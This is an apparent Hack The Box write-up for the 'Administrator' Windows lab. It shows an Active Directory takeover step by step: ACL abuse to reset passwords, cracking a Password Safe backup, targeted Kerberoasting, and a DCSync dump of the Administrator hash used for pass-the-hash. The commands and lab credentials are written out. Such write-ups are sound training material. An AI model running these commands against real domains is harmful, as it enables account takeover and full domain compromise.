---
title: "Administrator"
date: 2026-06-12 00:00:00 +0800
categories: [Writeup]
tags: [HTB, writeup]
---

# Box Info

![9d232b1558b7543c7cb85f2774687363](/assets/img/administrator/9d232b1558b7543c7cb85f2774687363.png)

> about

`Administrator` is a medium-difficulty Windows machine
designed around a complete domain compromise scenario, where credentials
for a low-privileged user are provided. To gain access to the `michael` account, ACLs (Access Control Lists) over privileged objects are enumerated, leading us to discover that the user `olivia` has `GenericAll` permissions over `michael`, allowing us to reset his password. With access as `michael`, it is revealed that he can force a password change on the user `benjamin`, whose password is reset. This grants access to `FTP` where a `backup.psafe3`
file is discovered, cracked, and reveals credentials for several users.
These credentials are sprayed across the domain, revealing valid
credentials for the user `emily`. Further enumeration shows that `emily` has `GenericWrite` permissions over the user `ethan`, allowing us to perform a targeted Kerberoasting attack. The recovered hash is cracked and reveals valid credentials for `ethan`, who is found to have `DCSync` rights ultimately allowing retrieval of the `Administrator` account hash and full domain compromise.

default credential: `Olivia:ichliebedich`

# Recon

## Initial Scanning

Nmap shows some ports and confirms it’s a Windows machine.

```shell
Nmap scan report for administrator.htb (10.129.163.131)
Host is up, received echo-reply ttl 127 (0.10s latency).
Scanned at 2026-06-12 13:23:28 CST for 2s
Not shown: 987 closed tcp ports (reset)
PORT     STATE SERVICE          REASON
21/tcp   open  ftp              syn-ack ttl 127
53/tcp   open  domain           syn-ack ttl 127
88/tcp   open  kerberos-sec     syn-ack ttl 127
135/tcp  open  msrpc            syn-ack ttl 127
139/tcp  open  netbios-ssn      syn-ack ttl 127
389/tcp  open  ldap             syn-ack ttl 127
445/tcp  open  microsoft-ds     syn-ack ttl 127
464/tcp  open  kpasswd5         syn-ack ttl 127
593/tcp  open  http-rpc-epmap   syn-ack ttl 127
636/tcp  open  ldapssl          syn-ack ttl 127
3268/tcp open  globalcatLDAP    syn-ack ttl 127
3269/tcp open  globalcatLDAPssl syn-ack ttl 127
5985/tcp open  wsman            syn-ack ttl 127

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.96 seconds
           Raw packets sent: 1132 (49.792KB) | Rcvd: 1132 (45.328KB)
```

## Initial Credentials

This target doesn't have a web interface, so I tried connecting to it with `evil-winrm` first.
After connecting to the target, I uploaded winPEAS but it returned nothing. The second move I made was using `SharpHound` to collect data for `BloodHound`. Something showed up.

![image_1781280850200_0](/assets/img/administrator/image_1781280850200_0.png)

The default credential user has `GenericAll` permission over another AD user. I can use `bloodyAD` to change the user's password and take ownership.

```shell
bloodyAD -d domain -u Olivia -p ichliebedich --host <Target's IP> set password michael 'Test@123!'
```

Still nothing on this target, so I looked back at AD.

![image_1781281337672_0](/assets/img/administrator/image_1781281337672_0.png)

`Michael` has `ForceChangePassword` permission over `Benjamin`. Same thing we need to do again XD.

```shell
bloodyAD -d domain -u michael -p 'Test@123!' --host <Target's IP> set password benjamin 'Test@456!'
```

I got stuck here after taking ownership of `Benjamin`, because I couldn't RDP or find anything in SMB. Then I noticed a unique AD group called `SHARE MODERATORS`, and from the `nmap` results, the target has an FTP service. Cool, let's give it a shot.

![image_1781281987826_0](/assets/img/administrator/image_1781281987826_0.png)

It's a Password Safe V3 database. I've used John to brute-force this kind of database before.

```shell
pwsafe2john Backup.psafe3 > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Got the password: `Backup:tekieromucho`.

![image_1781282722756_0](/assets/img/administrator/image_1781282722756_0.png)

There were 3 groups of user passwords in the database, but only `Emily` 's account was enabled.
`emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb`

You can get the user flag after logging into Emily's account.

![image_1781283122027_0](/assets/img/administrator/image_1781283122027_0.png)

I have completed the privilege escalation route above; now let's continue with the next route.
`emily` has `GenericWrite` permission over Ethan. I used [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast) to solve this. But [MuMu](https://github.com/MuMuuuu) said using Shadow Credentials can get the NTLM hash directly. Skill issue :(

```shell
python3 targetedKerberoast.py -d administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb -v
```

Using `hashcat` to crack the NTLM hash, we can get `ethan`'s credential.
`ethan:limpbizkit`

Final step: we find that Ethan has `GetChangesAll` and `GetChanges` permissions on the Domain. So we can use `impacket-secretsdump` to get the domain admin's NT hash and use it to get the root flag.

```shell
impacket-secretsdump administrator.htb/ethan:'limpbizkit'@<Target's IP>

evil-winrm -i 10.129.163.131 -u Administrator -H <NT hash>
```